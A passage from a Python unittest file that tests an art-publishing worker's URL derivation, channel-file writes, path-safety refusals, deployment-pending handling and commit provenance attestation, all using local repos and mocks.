        self.assertTrue(view.startswith("https://kody-w.github.io/Public-Art-Collective/"))
        self.assertIn("github.com/Kody-W/Public-Art-Collective/", source)

    def test_a_full_url_or_git_remote_still_yields_owner_and_name(self):
        for commons in ("https://github.com/kody-w/public-art-collective",
                        "https://github.com/kody-w/public-art-collective.git",
                        "git@github.com:kody-w/public-art-collective.git"):
            with self.subTest(commons=commons):
                view, _ = self.urls("submissions/a/piece.svg", commons=commons)
                self.assertEqual("https://kody-w.github.io/public-art-collective/"
                                 "view.html#/a", view)

    def test_a_local_path_is_not_a_public_url(self):
        view, source = EW.art_urls(
            {"commons_repo": ""}, {"repo": "/Users/someone/origin.git",
                                   "base_branch": "main"},
            {"piece_path": "submissions/a/piece.svg"})
        self.assertEqual(("", ""), (view, source))

    def test_the_worker_repo_is_used_when_commons_repo_is_unset(self):
        view, _ = EW.art_urls({}, {"repo": "kody-w/public-art-collective",
                                   "base_branch": "main"},
                              {"piece_path": "submissions/a/piece.txt"})
        self.assertEqual("https://kody-w.github.io/public-art-collective/"
                         "view.html#/a", view)

    def test_a_message_without_a_derivable_url_says_so(self):
        text = EW.art_notification(
            {"instance_name": "Dada"}, {"repo": "/local/path"},
            {"title": "Thing", "piece_path": "submissions/a/piece.svg",
             "meta": {"title": "Thing"}}, {"pr_url": "https://example/pr/1"})
        self.assertIn("no Public Art Collective Pages URL", text)

    def test_the_recipient_prefers_the_report_number(self):
        self.assertEqual("+1555", EW.art_recipient(
            {"report_number": "+1555", "notify_handle": "+1999"}))
        self.assertEqual("+1999", EW.art_recipient({"notify_handle": "+1999"}))
        self.assertEqual("", EW.art_recipient({}))


class VisionAdapterTests(ScratchCase):
    def setUp(self):
        super().setUp()
        self.repo = self.home / "vision"
        self.repo.mkdir()
        (self.repo / "channels.json").write_text(json.dumps({
            "schema": EW.VISION_NETWORK_SCHEMA,
            "revision": {"sequence": 1, "updated": "2026-08-01T00:00:00Z"},
            "channels": [],
        }), encoding="utf-8")
        self.wcfg = EW.worker_config({"evolve_worker": {
            "rapp_vision": {"enabled": True, "repo": str(self.repo)}}})
        self.vcfg = EW.vision_config(self.wcfg)
        meta = meta_for("new-piece")
        self.submission = {
            "slug": "new-piece",
            "title": "New Piece",
            "kind": "svg",
            "meta": meta,
            "piece_path": "submissions/new-piece/piece.svg",
            "piece_sha256": hashlib.sha256(SVG.encode()).hexdigest(),
        }

    def test_one_artifact_becomes_one_registered_live_entry(self):
        entry, changed = EW.write_vision_files(
            self.repo, self.submission, SVG.encode(), self.vcfg)
        self.assertEqual(
            ["channels.json", "dada/channel.json",
             "dada/media/new-piece.svg"],
            changed)
        self.assertEqual(
            "https://kody-w.github.io/public-art-collective/view.html#/new-piece",
                         entry["live"]["scenes"][1]["app"])
        self.assertEqual("media/new-piece.svg", entry["thumb"])
        self.assertEqual([], entry["sources"])
        channel = json.loads((self.repo / "dada/channel.json").read_text())
        self.assertEqual(["new-piece"], [v["id"] for v in channel["videos"]])
        registry = json.loads((self.repo / "channels.json").read_text())
        self.assertEqual("dada-collective", registry["channels"][-1]["id"])

    def test_reapplying_the_same_art_is_idempotent(self):
        EW.write_vision_files(
            self.repo, self.submission, SVG.encode(), self.vcfg)
        _, changed = EW.write_vision_files(
            self.repo, self.submission, SVG.encode(), self.vcfg)
        self.assertEqual([], changed)

    def test_an_existing_id_with_different_bytes_fails_closed(self):
        EW.write_vision_files(
            self.repo, self.submission, SVG.encode(), self.vcfg)
        with self.assertRaises(EW.GateError):
            EW.write_vision_files(
                self.repo, self.submission, b"<svg/>", self.vcfg)

    def test_platform_urls_are_public_experience_links(self):
        urls = EW.vision_urls(
            {**self.vcfg, "repo": "kody-w/rapp-vision"},
            self.submission)
        self.assertEqual(
            "https://kody-w.github.io/rapp-vision/#/watch/new-piece",
            urls["watch_url"])
        self.assertEqual(
            "https://kody-w.github.io/rapp-vision/dada/media/new-piece.svg",
            urls["media_url"])
        self.assertEqual(
            "https://kody-w.github.io/public-art-collective/view.html#/new-piece",
            urls["scene_url"])

    def test_unsafe_channel_paths_are_refused(self):
        bad = dict(self.wcfg, rapp_vision={
            **self.wcfg["rapp_vision"], "channel_path": "../channel.json"})
        with self.assertRaises(EW.GateError):
            EW.vision_config(bad)

    def test_png_bytes_and_ihdr_dimensions_reach_vision_exactly(self):
        image = real_png(width=512, height=640)
        profile_wcfg = reviewed_png_wcfg(self.home)
        meta = with_reviewed_png_receipt(
            {**self.submission["meta"], "kind": "png"},
            image, profile_wcfg)
        submission = {
            **self.submission,
            "kind": "png",
            "meta": meta,
            "piece_path": "submissions/new-piece/piece.png",
            "piece_sha256": hashlib.sha256(image).hexdigest(),
        }
        entry, changed = EW.write_vision_files(
            self.repo, submission, image, self.vcfg)
        self.assertIn("dada/media/new-piece.png", changed)
        self.assertEqual(
            image, self.repo.joinpath("dada/media/new-piece.png").read_bytes())
        self.assertEqual((512, 640, "portrait"),
                         (entry["width"], entry["height"],
                          entry["orientation"]))
        self.assertEqual("media/new-piece.png", entry["thumb"])
        self.assertEqual([], entry["sources"])
        self.assertTrue(
            entry["live"]["scenes"][1]["app"].endswith("#/new-piece"))

    def test_thumb_paths_cannot_escape_the_channel_directory(self):
        unsafe = {**self.vcfg, "media_dir": "other-media"}
        profile_wcfg = reviewed_png_wcfg(self.home)
        meta = with_reviewed_png_receipt(
            {**self.submission["meta"], "kind": "png"},
            PNG, profile_wcfg)
        submission = {
            **self.submission,
            "kind": "png",
            "meta": meta,
            "piece_path": "submissions/new-piece/piece.png",
            "piece_sha256": hashlib.sha256(PNG).hexdigest(),
        }
        with self.assertRaises(EW.GateError):
            EW.write_vision_files(
                self.repo, submission, PNG, unsafe)


class PngPagesProbeTests(ScratchCase):
    class Response:
        def __init__(self, status=200, content_type="image/png",
                     body=EW.azure_art.PNG_SIGNATURE):
            self.status = status
            self.headers = {"Content-Type": content_type}
            self.body = body

        def __enter__(self):
            return self

        def __exit__(self, *_):
            return False

        def getcode(self):
            return self.status

        def read(self, size=-1):
            return self.body[:size]

    def test_direct_png_probe_checks_status_type_and_signature(self):
        cases = {
            "ok": (self.Response(), True),
            "status": (self.Response(status=404), False),
            "type": (self.Response(content_type="text/html"), False),
            "signature": (self.Response(body=b"<html>no"), False),
        }
        for label, (response, expected) in cases.items():
            with self.subTest(label=label):
                ok, _ = REAL_PNG_PROBE(
                    "https://example.test/piece.png",
                    opener=lambda request, timeout: response)
                self.assertEqual(expected, ok)

    def test_profile_pages_use_typed_media_probes_and_route_probes(self):
        wcfg = reviewed_png_wcfg(self.home)
        wcfg["repo"] = "kody-w/public-art-collective"
        wcfg["rapp_vision"] = {
            **wcfg["rapp_vision"],
            "repo": "kody-w/rapp-vision",
        }
        submission = {
            "slug": "visual-piece",
            "title": "Visual Piece",
            "kind": "png",
            "meta": meta_for("visual-piece", kind="png"),
            "piece_path": "submissions/visual-piece/piece.png",
        }
        vision = EW.vision_urls(EW.vision_config(wcfg), submission)
        routes, media = [], []

        def route_probe(url, timeout):
            routes.append(url)
            return True, "HTTP 200"

        def media_probe(url, timeout):
            media.append(url)
            return True, "HTTP 200 image/png PNG"

        result = EW.verify_dual_pages(
            {"commons_repo": "kody-w/public-art-collective"},
            wcfg, submission, vision, probe=route_probe,
            png_probe=media_probe, sleep=lambda _: None,
            profile_snapshot=EW.publication_profile_snapshot(wcfg))
        self.assertEqual(
            {
                EW.piece_pages_url(
                    {"commons_repo": "kody-w/public-art-collective"},
                    wcfg, submission),
                vision["media_url"],
            },
            set(media))
        self.assertIn(vision["watch_url"], routes)
        self.assertIn(EW.vision_config(wcfg)["player_url"], routes)
        self.assertEqual(vision["watch_url"], result["vision_url"])

    def test_wrong_media_response_keeps_profile_deployment_pending(self):
        wcfg = reviewed_png_wcfg(self.home)
        wcfg["repo"] = "kody-w/public-art-collective"
        wcfg["rapp_vision"] = {
            **wcfg["rapp_vision"], "repo": "kody-w/rapp-vision"}
        submission = {
            "slug": "visual-piece", "title": "Visual Piece", "kind": "png",
            "meta": meta_for("visual-piece", kind="png"),
            "piece_path": "submissions/visual-piece/piece.png",
        }
        vision = EW.vision_urls(EW.vision_config(wcfg), submission)
        with self.assertRaises(EW.DeploymentPending) as cm:
            EW.verify_dual_pages(
                {"commons_repo": "kody-w/public-art-collective"},
                wcfg, submission, vision,
                probe=lambda url, timeout: (True, "HTTP 200"),
                png_probe=lambda url, timeout: (
                    False, "HTTP 200 Content-Type text/html"),
                sleep=lambda _: None,
                profile_snapshot=EW.publication_profile_snapshot(wcfg))
        self.assertIn("Content-Type text/html", str(cm.exception))


class VisionPublisherTests(ScratchCase):
    def setUp(self):
        super().setUp()
        self.origin = self.home / "vision-origin.git"
        seed = self.home / "vision-seed"
        seed.mkdir()
        git(seed, "init", "-b", "main")
        git(seed, "config", "user.email", "t@example.com")
        git(seed, "config", "user.name", "t")
        (seed / "channels.json").write_text(json.dumps({
            "schema": EW.VISION_NETWORK_SCHEMA,
            "revision": {"sequence": 1, "updated": "2026-08-01T00:00:00Z"},
            "channels": [],
        }), encoding="utf-8")
        git(seed, "add", "-A")
        git(seed, "commit", "-m", "seed")
        git(self.home, "init", "--bare", "-b", "main", str(self.origin))
        git(seed, "remote", "add", "origin", str(self.origin))
        git(seed, "push", "-u", "origin", "main")
        self.fake_gh = FakeGh(self.origin)
        patch = mock.patch.object(EW, "_gh", self.fake_gh)
        patch.start()
        self.addCleanup(patch.stop)
        self.wcfg = EW.worker_config({"evolve_worker": {
            "repo": str(self.home / "collective.git"),
            "git_author_name": "test",
            "git_author_email": "t@example.com",
            "rapp_vision": {"enabled": True, "repo": str(self.origin)},
        }})
        meta = meta_for("new-piece")
        self.submission = {
            "slug": "new-piece", "title": "New Piece", "kind": "svg",
            "meta": meta, "piece_path": "submissions/new-piece/piece.svg",
            "piece_sha256": hashlib.sha256(SVG.encode()).hexdigest(),
        }

    def test_publish_merges_and_re_reads_the_channel(self):
        workspace = self.home / "workspace"
        workspace.mkdir()
        receipts = EW.publish_rapp_vision(
            workspace, self.submission, SVG.encode(), self.wcfg,
            lambda phase: healthy())
        self.assertTrue(receipts["merge_commit"])
        tree = git_bare(self.origin, "ls-tree", "-r", "--name-only", "main")
        self.assertIn("dada/channel.json", tree)
        self.assertIn("dada/media/new-piece.svg", tree)
        self.assertTrue(self.fake_gh.called("pr", "merge"))

        second_workspace = self.home / "workspace-2"
        second_workspace.mkdir()
        calls = len(self.fake_gh.calls)
        repeated = EW.publish_rapp_vision(
            second_workspace, self.submission, SVG.encode(), self.wcfg,
            lambda phase: healthy())
        self.assertEqual(receipts["media_url"], repeated["media_url"])
        self.assertEqual(calls, len(self.fake_gh.calls),
                         "an already deployed entry opens no second PR")


class DualDeploymentFlowTests(WorkerEnv):
    def config(self):
        return worker_cfg(
            notification_mode="art-only",
            evolve_worker={
                "repo": str(self.origin),
                "git_author_name": "test",
                "git_author_email": "t@example.com",
                "rapp_vision": {
                    "enabled": True,
                    "repo": str(self.origin),
                },
            })

    def deployed(self, collective):
        return {
            **collective,
            "collective_url": (
                "https://kody-w.github.io/public-art-collective/"
                "submissions/new-piece/piece.svg"),
            "vision_url": (
                "https://kody-w.github.io/rapp-vision/#/watch/new-piece"),
            "vision": {
                "watch_url": (
                    "https://kody-w.github.io/rapp-vision/#/watch/new-piece"),
            },
        }

    def test_success_is_recorded_only_after_both_platforms(self):
        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None):
            return self.deployed(receipts)

        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "finish_platform_deployments", finish):
            summary = EW.run_once(
                cfg=self.config(), health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual(1, len(self.notifications))
        text = self.texts()[0]
        self.assertIn("Public Art Collective:", text)
        self.assertIn("RAPP Vision:", text)
        self.assertNotIn("Static HTML report:", text)

    def test_partial_deployment_stays_pending_and_silent(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(
                 EW, "finish_platform_deployments",
                 side_effect=EW.DeploymentPending("Pages still building")):
            summary = EW.run_once(
                cfg=self.config(), health=lambda phase: healthy())
        self.assertEqual("deployment-pending", summary["outcome"])
        self.assertEqual([], self.notifications)
        self.assertTrue(EW.TRANSACTION_PATH.exists())
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual("pending", history[0]["outcome"])

    def test_next_pass_reconciles_without_spending_another_model(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(
                 EW, "finish_platform_deployments",
                 side_effect=EW.DeploymentPending("Pages still building")):
            EW.run_once(cfg=self.config(), health=lambda phase: healthy())

        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None):
            return self.deployed(receipts)

        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW, "finish_platform_deployments", finish):
            summary = EW.run_once(
                cfg=self.config(), health=lambda phase: healthy())
        self.assertEqual("reconciled-contributed", summary["outcome"], summary)
        maker.assert_not_called()
        self.assertEqual(1, len(self.notifications))
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_persistent_pending_becomes_a_visible_fail_closed_state(self):
        cfg = self.config()
        wcfg = EW.worker_config(cfg)
        wcfg["rapp_vision"]["deployment_retry_limit"] = 2
        row = {"id": "row", "at": NOW.isoformat(), "outcome": "pending",
               "role": "openrappter", "cycle": 1}
        history = [row]
        EW.save_history(history)
        note = EW.transaction_writer("row", {"phase": "collective-merged"})
        note()
        first = EW.deployment_pending(
            history, row, EW.DeploymentPending("wait"),
            transaction=note, wcfg=wcfg)
        second = EW.deployment_pending(
            history, row, EW.DeploymentPending("wait"),
            transaction=note, wcfg=wcfg)
        self.assertEqual("deployment-pending", first["outcome"])
        self.assertEqual("fail-closed", second["outcome"])
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual("fail-closed", status["outcome"])
        self.assertEqual(2, status["deployment_attempts"])

    def test_an_interrupted_vision_pr_is_closed_before_retry(self):
        wcfg = EW.worker_config(self.config())
        EW.clean_interrupted_vision_pr(
            {"vision_pr_number": "7"}, wcfg)
        self.assertTrue(self.gh.called("pr", "close"))

    def test_retry_uses_the_channel_contract_captured_by_the_cycle(self):
        original = self.config()
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(
                 EW, "finish_platform_deployments",
                 side_effect=EW.DeploymentPending("Pages still building")):
            EW.run_once(cfg=original, health=lambda phase: healthy())

        changed = self.config()
        changed["evolve_worker"]["rapp_vision"]["duration"] = 120
        seen = {}

        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None):
            seen["duration"] = wcfg["rapp_vision"]["duration"]
            return self.deployed(receipts)

        with mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW, "finish_platform_deployments", finish):
            summary = EW.run_once(
                cfg=changed, health=lambda phase: healthy())
        self.assertEqual("reconciled-contributed", summary["outcome"])
        self.assertEqual(60, seen["duration"])
        maker.assert_not_called()


class ReviewedPngWorkerFlowTests(WorkerEnv):
    def visual_config(self):
        return worker_cfg(
            notification_mode="art-only",
            evolve_worker={
                "repo": str(self.origin),
                "branch_prefix": EW.REVIEWED_PNG_BRANCH_PREFIX,
                "git_author_name": EW.REVIEWED_PNG_COMMIT_NAME,
                "git_author_email": EW.REVIEWED_PNG_COMMIT_EMAIL,
                "publication_profile": EW.AZURE_REVIEWED_PNG_PROFILE,
                "allowed_kinds": ["png"],
                "max_piece_bytes": 10 * 1024 * 1024,
                "azure_image": {
                    "enabled": True,
                    "endpoint": "https://dada.example.openai.azure.com",
                    "deployment": "gpt-image-2",
                    "fallback_deployment": "gpt-image-2",
                    "max_attempts": 2,
                    "minimum_review_score": 8,
                    "review_model": "gpt-5.4",
                },
                "rapp_vision": {
                    "enabled": True,
                    "repo": str(self.origin),
                },
            })

    @staticmethod
    def review():
        return {
            "schema": EW.IMAGE_REVIEW_SCHEMA,
            "score": 9,
            "publish": True,
            "failures": [],
            "strengths": ["strong focal hierarchy"],
        }

    def visual_model(self, direct_png=False, **meta_overrides):
        prompt_text = (
            "A finished surreal museum image with one impossible stone arch, "
            "cobalt light, deep texture, and no lettering.")

        def fake(staging, prompt, wcfg, depth=0, runtime=None):
            staging = Path(staging)
            out = staging / "out" / EW.SUBMISSION_DIR
            meta = meta_for(
                "visual-piece", kind="png", _image_prompt=prompt_text,
                **meta_overrides)
            out.joinpath("meta.json").write_text(
                json.dumps(meta), encoding="utf-8")
            if direct_png:
                out.joinpath("piece.png").write_bytes(PNG)
            else:
                out.joinpath("piece.prompt").write_text(
                    prompt_text, encoding="utf-8")
            staging.joinpath("state-out.json").write_text(
                json.dumps({
                    "cycle": 1,
                    "last_slug": "visual-piece",
                    "notes": "pixels must carry the premise",
                }),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED visual concept\n"
        return fake

    @staticmethod
    def deployed(receipts):
        return {
            **receipts,
            "collective_url": (
                "https://kody-w.github.io/public-art-collective/"
                "view.html#/visual-piece"),
            "vision_url": (
                "https://kody-w.github.io/rapp-vision/"
                "#/watch/visual-piece"),
            "vision": {
                "watch_url": (
                    "https://kody-w.github.io/rapp-vision/"
                    "#/watch/visual-piece"),
            },
        }

    def run_to_pending(self):
        with mock.patch.object(EW, "assert_publish_auth",
                               return_value="local test repo"), \
             mock.patch.object(EW, "assert_visual_pipeline_ready",
                               return_value="ready"), \
             mock.patch.object(EW, "run_model", self.visual_model()), \
             mock.patch.object(EW.azure_art, "generate",
                               return_value=(PNG, "gpt-image-2")), \
             mock.patch.object(EW, "review_generated_image",
                               side_effect=lambda *_: self.review()), \
             mock.patch.object(
                 EW, "finish_platform_deployments",
                 side_effect=EW.DeploymentPending("Pages still building")):
            result = EW.run_once(
                cfg=self.visual_config(), health=lambda phase: healthy())
        self.assertEqual("deployment-pending", result["outcome"], result)
        return json.loads(EW.TRANSACTION_PATH.read_text())

    def run_visual_with_verified_deployment(self, cfg=None):
        def finish(cfg, wcfg, workspace, clone, submission, receipts, health,
                   transaction=None, profile_snapshot=None):
            return self.deployed(receipts)

        with mock.patch.object(EW, "assert_publish_auth",
                               return_value="local test repo"), \
             mock.patch.object(EW, "assert_visual_pipeline_ready",
                               return_value="ready"), \
             mock.patch.object(EW, "run_model", self.visual_model()), \
             mock.patch.object(EW.azure_art, "generate",
                               return_value=(PNG, "gpt-image-2")), \
             mock.patch.object(EW, "review_generated_image",
                               side_effect=lambda *_: self.review()), \
             mock.patch.object(EW, "finish_platform_deployments", finish):
            return EW.run_once(
                cfg=cfg or self.visual_config(),
                health=lambda phase: healthy())

    def test_profile_conflict_preflight_spends_no_model_or_fanout(self):
        cfg = self.visual_config()
        cfg["evolve_worker"]["azure_image"]["minimum_review_score"] = 7
        cfg["evolve_worker"]["fanout"] = {"enabled": True, "children": 3}
        with mock.patch.object(EW, "assert_publish_auth") as auth, \
             mock.patch.object(EW, "assert_visual_pipeline_ready") as visual, \
             mock.patch.object(EW.SS, "run_children") as children, \
             mock.patch.object(EW, "run_model") as maker, \
             mock.patch.object(EW.azure_art, "generate") as generator, \
             mock.patch.object(EW, "review_generated_image") as reviewer:
            result = EW.run_once(cfg=cfg, health=lambda phase: healthy())
        self.assertEqual("skipped", result["outcome"])
        self.assertIn("publication profile preflight failed", result["reason"])
        auth.assert_not_called()
        visual.assert_not_called()
        children.assert_not_called()
        maker.assert_not_called()
        generator.assert_not_called()
        reviewer.assert_not_called()
        self.assertFalse(EW.HISTORY_PATH.exists())

    def test_identifier_mismatch_preflight_spends_nothing(self):
        for field, value in (
                ("deployment", "gpt image 2"),
                ("review_model", "gpt 5.4")):
            cfg = self.visual_config()
            cfg["evolve_worker"]["azure_image"][field] = value
            cfg["evolve_worker"]["fanout"] = {
                "enabled": True, "children": 3}
            with self.subTest(field=field), \
                 mock.patch.object(EW, "assert_publish_auth") as auth, \
                 mock.patch.object(
                     EW, "assert_visual_pipeline_ready") as visual, \
                 mock.patch.object(EW.SS, "run_children") as children, \
                 mock.patch.object(EW, "run_model") as maker, \
                 mock.patch.object(EW.azure_art, "generate") as generator, \
                 mock.patch.object(
                     EW, "review_generated_image") as reviewer:
                result = EW.run_once(
                    cfg=cfg, health=lambda phase: healthy())
            self.assertEqual("skipped", result["outcome"], result)
            self.assertIn(
                "publication profile preflight failed", result["reason"])
            auth.assert_not_called()
            visual.assert_not_called()
            children.assert_not_called()
            maker.assert_not_called()
            generator.assert_not_called()
            reviewer.assert_not_called()
        self.assertFalse(EW.HISTORY_PATH.exists())
        self.assertEqual([], self.gh.calls)

    def test_controller_identity_conflicts_preflight_before_any_spend(self):
        for field, value in (
                ("branch_prefix", "art"),
                ("git_author_name", "Mutable Dada"),
                ("git_author_email", "mutable@example.com")):
            cfg = self.visual_config()
            cfg["evolve_worker"][field] = value
            cfg["evolve_worker"]["fanout"] = {
                "enabled": True, "children": 3}
            with self.subTest(field=field), \
                 mock.patch.object(EW, "assert_publish_auth") as auth, \
                 mock.patch.object(EW.SS, "run_children") as children, \
                 mock.patch.object(EW, "run_model") as maker, \
                 mock.patch.object(EW.azure_art, "generate") as generator, \
                 mock.patch.object(
                     EW, "review_generated_image") as reviewer:
                result = EW.run_once(
                    cfg=cfg, health=lambda phase: healthy())
            self.assertEqual("skipped", result["outcome"], result)
            self.assertIn(
                "publication profile preflight failed", result["reason"])
            auth.assert_not_called()
            children.assert_not_called()
            maker.assert_not_called()
            generator.assert_not_called()
            reviewer.assert_not_called()
        self.assertFalse(EW.HISTORY_PATH.exists())
        self.assertEqual([], self.gh.calls)

    def test_controller_commit_fixture_passes_collective_offline_attestation(self):
        verifier = require_collective_verifier(
            self, "cross-repo attestation test")
        transaction = self.run_to_pending()
        commit_sha = transaction["commit"]
        branch = transaction["branch"]
        parent_sha = git_bare(
            self.origin, "rev-parse", f"{commit_sha}^").strip()

        candidate = self.home / "attestation-candidate"
        trusted_base = self.home / "attestation-base"
        git(self.home, "clone", str(self.origin), str(candidate))
        git(candidate, "checkout", "--detach", commit_sha)
        git(self.home, "clone", str(self.origin), str(trusted_base))
        git(trusted_base, "checkout", "--detach", parent_sha)

        raw_identity = git_bare(
            self.origin, "show", "-s",
            "--format=%an%x00%ae%x00%aI%x00%cn%x00%ce%x00%cI%x00%B",
            commit_sha)
        (author_name, author_email, author_date, committer_name,
         committer_email, committer_date, message) = raw_identity.split(
             "\0", 6)
        message = message.rstrip("\n")
        slug = transaction["submission"]["slug"]
        subject = message.splitlines()[0]

        def api_user(login):
            return {"login": login, "type": "User"}

        def repository():
            return {
                "full_name": "kody-w/public-art-collective",
                "fork": False,
                "owner": api_user("kody-w"),
            }

        repo = repository()
        pull_request = {
            "number": 7,
            "state": "open",
            "draft": False,
            "title": subject,
            "commits": 1,
            "changed_files": 2,
            "author_association": "OWNER",
            "user": api_user("kody-w"),
            "base": {
                "ref": "main",
                "sha": parent_sha,
                "repo": copy.deepcopy(repo),
            },
            "head": {
                "ref": branch,
                "sha": commit_sha,
                "repo": copy.deepcopy(repo),
            },
        }
        commit_record = {
            "sha": commit_sha,
            "parents": [{"sha": parent_sha}],
            "author": api_user("kody-w"),
            "committer": api_user("kody-w"),
            "commit": {
                "author": {
                    "name": author_name,
                    "email": author_email,
                    "date": author_date,
                },
                "committer": {
                    "name": committer_name,
                    "email": committer_email,
                    "date": committer_date,
                },
                "message": message,
                "verification": {
                    "verified": False,
                    "reason": "unsigned",
                },
            },
        }

        def blob_sha(path):
            payload = path.read_bytes()
            prefix = f"blob {len(payload)}\0".encode("ascii")
            return hashlib.sha1(prefix + payload).hexdigest()

        files = [
            {
                "filename": f"submissions/{slug}/meta.json",
                "status": "added",
                "sha": blob_sha(
                    candidate / "submissions" / slug / "meta.json"),
            },
            {
                "filename": f"submissions/{slug}/piece.png",
                "status": "added",
                "sha": blob_sha(
                    candidate / "submissions" / slug / "piece.png"),
            },
        ]
        event = {
            "action": "opened",
            "number": 7,
            "repository": copy.deepcopy(repo),
            "pull_request": copy.deepcopy(pull_request),
        }
        evidence = {
            "pull_request": copy.deepcopy(pull_request),
            "commits": [copy.deepcopy(commit_record)],
            "files": files,
            "head_commit": copy.deepcopy(commit_record),
            "pull_request_after": copy.deepcopy(pull_request),
        }
        contract = collective_controller_contract()
        self.assertEqual(contract["branch_prefix"] + "/", branch[:9])
        self.assertEqual(contract["commit_name"], author_name)
        self.assertEqual(contract["commit_name"], committer_name)
        self.assertEqual(contract["commit_email"], author_email)
        self.assertEqual(contract["commit_email"], committer_email)
        body_prefix, body_suffix = contract["commit_body_template"].split(
            "{role}", 1)
        body_line = message.splitlines()[2]
        self.assertTrue(body_line.startswith(body_prefix))
        self.assertTrue(body_line.endswith(body_suffix))
        role = body_line[
            len(body_prefix):len(body_line) - len(body_suffix)]
        self.assertIn(
            contract["commit_body_template"].format(
                role=role),
            message)

        expected_success = (
            f"reviewed PNG provenance attested for '{slug}' at "
            f"{commit_sha}\n")

        event_path = self.home / "attestation-event.json"
        evidence_path = self.home / "attestation-api.json"

        def invoke(event_doc, evidence_doc):
            event_path.write_text(
                json.dumps(event_doc), encoding="utf-8")
            evidence_path.write_text(
                json.dumps(evidence_doc), encoding="utf-8")
            environment = EW._minimal_env()
            environment["PYTHONDONTWRITEBYTECODE"] = "1"
            result = subprocess.run(
                [
                    sys.executable,
                    str(verifier),
                    "--event-path", str(event_path),
                    "--api-fixture", str(evidence_path),
                    "--candidate-root", str(candidate),
                    "--base-root", str(trusted_base),
                    "--trusted-base-sha", parent_sha,
                ],
                cwd=str(verifier.parents[1]),
                env=environment,
                capture_output=True,
                text=True,
                timeout=30,
            )
            return result.returncode, result.stdout + result.stderr

        code, detail = invoke(event, evidence)
        self.assertEqual(0, code, detail)
        self.assertEqual(expected_success, detail)

        def mutate_branch(event_doc, evidence_doc):
            bad = f"{contract['branch_prefix']}/{slug}-DEADBEEF"
            event_doc["pull_request"]["head"]["ref"] = bad
            evidence_doc["pull_request"]["head"]["ref"] = bad
            evidence_doc["pull_request_after"]["head"]["ref"] = bad

        def mutate_commit(event_doc, evidence_doc, identity, field, value):
            del event_doc
            for record in (
                    evidence_doc["commits"][0],
                    evidence_doc["head_commit"]):
                record["commit"][identity][field] = value

        def mutate_body(event_doc, evidence_doc):
            del event_doc
            for record in (
                    evidence_doc["commits"][0],
                    evidence_doc["head_commit"]):
                record["commit"]["message"] = (
                    record["commit"]["message"].replace(
                        "neighbor of Dada Collective.",
                        "neighbor of Mutable Collective."))

        mutations = [
            (
                "branch",
                mutate_branch,
                "reviewed PNG head branch must match "
                f"'art/dada/{slug}-<8 lowercase hex>'",
            ),
            (
                "author name",
                lambda event_doc, evidence_doc: mutate_commit(
                    event_doc, evidence_doc, "author", "name",
                    "Mutable Dada"),
                "api.commits[0].commit.author.name must be "
                f"{contract['commit_name']!r}",
            ),
            (
                "author email",
                lambda event_doc, evidence_doc: mutate_commit(
                    event_doc, evidence_doc, "author", "email",
                    "mutable@example.com"),
                "api.commits[0].commit.author.email must be "
                f"{contract['commit_email']!r}",
            ),
            (
                "committer name",
                lambda event_doc, evidence_doc: mutate_commit(
                    event_doc, evidence_doc, "committer", "name",
                    "Mutable Dada"),
                "api.commits[0].commit.committer.name must be "
                f"{contract['commit_name']!r}",
            ),
            (
                "committer email",
                lambda event_doc, evidence_doc: mutate_commit(
                    event_doc, evidence_doc, "committer", "email",
                    "mutable@example.com"),
                "api.commits[0].commit.committer.email must be "
                f"{contract['commit_email']!r}",
            ),
            (
                "provenance body",
                mutate_body,
                "Dada controller commit message has the wrong exact "
                "provenance form",
            ),
        ]
        for label, mutate, reason in mutations:
            bad_event = copy.deepcopy(event)
            bad_evidence = copy.deepcopy(evidence)
            mutate(bad_event, bad_evidence)
            code, detail = invoke(bad_event, bad_evidence)
            with self.subTest(field=label):
                self.assertEqual(1, code, detail)
                self.assertEqual(
                    "error: reviewed PNG provenance rejected: "
                    f"{reason}\n",
                    detail,
                )

    def test_controller_commit_fixture_cross_check_skips_without_collective_verifier(
            self):
        with mock.patch.object(
                sys.modules[__name__], "collective_verifier_path",
                return_value=None):
            with self.assertRaises(unittest.SkipTest) as raised:
                self.test_controller_commit_fixture_passes_collective_offline_attestation()
        self.assertEqual(
            "real sibling Collective verify_png_attestation.py is "
            "unavailable for cross-repo attestation test",
            str(raised.exception),
        )

    def test_collective_validator_failure_stops_before_push_or_pr(self):
        self.replace_collective_validator(
            "import sys\n"
            "print('reviewed metadata rejected', file=sys.stderr)\n"
            "raise SystemExit(9)\n"
        )
        with mock.patch.object(
                EW, "assert_publish_auth",
                return_value="local test repo"), \
             mock.patch.object(
                 EW, "assert_visual_pipeline_ready", return_value="ready"), \
             mock.patch.object(
                 EW, "run_model", self.visual_model()), \
             mock.patch.object(
                 EW.azure_art, "generate",
                 return_value=(PNG, "gpt-image-2")) as generator, \
             mock.patch.object(
                 EW, "review_generated_image",
                 side_effect=lambda *_: self.review()) as reviewer:
            result = EW.run_once(
                cfg=self.visual_config(), health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, result["outcome"], result)
        self.assertIn(
            "canonical Public Art Collective validation rejected",
            result["detail"])
        self.assertIn("reviewed metadata rejected", result["detail"])
        generator.assert_called_once()
        reviewer.assert_called_once()
        self.assertFalse(self.gh.called("pr", "create"))
        branches = git_bare(
            self.origin, "for-each-ref", "--format=%(refname)",
            "refs/heads/")
        self.assertEqual(["refs/heads/main"], branches.split())
        self.assertEqual([], self.notifications)

    def test_collective_validator_happy_path_uses_python_without_shell(self):
        calls = []
        real_run = subprocess.run

        def recording_run(*args, **kwargs):
            argv = args[0]
            if (
                isinstance(argv, list)
                and len(argv) == 3
